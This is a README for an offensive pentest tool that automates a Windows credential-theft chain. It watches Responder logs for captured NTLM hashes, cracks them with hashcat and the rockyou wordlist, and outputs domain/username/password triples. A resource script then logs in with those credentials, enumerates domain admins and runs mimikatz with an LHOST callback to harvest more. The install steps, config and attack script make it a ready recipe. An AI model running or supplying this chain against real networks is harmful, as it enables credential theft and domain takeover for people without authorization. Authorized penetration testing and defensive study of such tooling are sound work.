## Responder to Credentials

### Install
```
pip install watchdog
git clone https://git.praetorianlabs.com/thebarbershopper/gladius
```

### Configuration
First things first, have to set our configuration:
```
[Responder]
hashcat = /root/tools/hashcat/hashcat-cli64.bin # Path to hashcat binary
wordlist = /root/tools/hashcat/rockyou.txt # Path to wordlist for hashcat
ruleset = /root/tools/hob064.rule # Path to ruleset for hashcat 
log_path = /opt/responder/logs # Path to monitor for new Responder hashes

[Creds]
outfile_path = /root/creds # File to write cracked credentials
```

### Start
After setting up configuration, simple start.
```
python2 start.py
```

```
[root@Praetorian-IPTD-4 auto-pentest]# python2 start.py --help
usage: start.py [-h] [-v]

optional arguments:
  -h, --help     show this help message and exit
  -v, --verbose  Increased output verbosity
```

### Start Responder and watch cracked credentials fly by..

### Output

![exmaple.png](example.png)

### Example module

```
class CredsHandler(GladiusHandler):

    patterns = ['*']

    def process(self, event):
        with open(event.src_path, 'r') as f:
            data = f.read().split('\n')

        # Perform work on data
```


Add yourself to the handlers list
```
handlers = [(ResponderHandler, config.get('Responder', 'watch_path')),
            (CredsHandler, ResponderHandler().outpath),
            (PentestlyHandler, CredsHandler().outpath)]
```

### Workings

#### Responder

Watches responder log for `*NTLM*txt` files. For each file found, parses output, creates a temp file containing the new hashes, and passes this to hashcat with the correct hash type

#### Credentials

Watches for output from `hashcat` and exports files with the following format:

```
Domain Username Password
```

#### Pentestly

Watches for sanitized hashcat output and passes credentials to `pentestly` via the following resource script.

```
workspaces add gladius
load nmap
set filename /tmp/gladius.xml
run

load login
set domain DOMAIN
set username USERNAME
set password PASSWORD
run

load get_domain_admin_names
run

load mimikatz
set lhost LHOST
run

load reporting/csv
set filename OUTFILE
set table pentestly_creds
run
```

#### Admin

Watches for output from Pentestly and parses the found credentials for `Local Admin` and new credentials from `Mimikatz`
